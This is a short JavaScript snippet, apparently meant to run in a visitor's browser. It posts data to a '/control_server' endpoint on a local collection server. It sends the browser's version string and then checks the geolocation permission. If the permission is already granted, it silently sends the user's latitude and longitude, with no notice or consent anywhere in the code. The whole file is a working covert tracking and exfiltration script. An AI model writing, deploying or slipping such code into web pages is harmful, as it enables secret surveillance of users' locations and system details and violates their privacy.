IP ='http://127.0.0.1:5000'
DefaultIP = IP + '/control_server'

//Log Function to Simple Server in default IP
function log(C){
fetch(DefaultIP,
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( C),
        headers:{"Content-Type": "application/json"}
        }
)
}



//Log OS
log(window.navigator.appVersion)

function captureGeolocation(){

        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            log({lat: latitude, lon : longitude}) });}



navigator.permissions
    .query({ name: "geolocation" })
    .then(function (_a) {
    var state = _a.state;
    if (state === "granted") {
        captureGeolocation();
    }
}); 





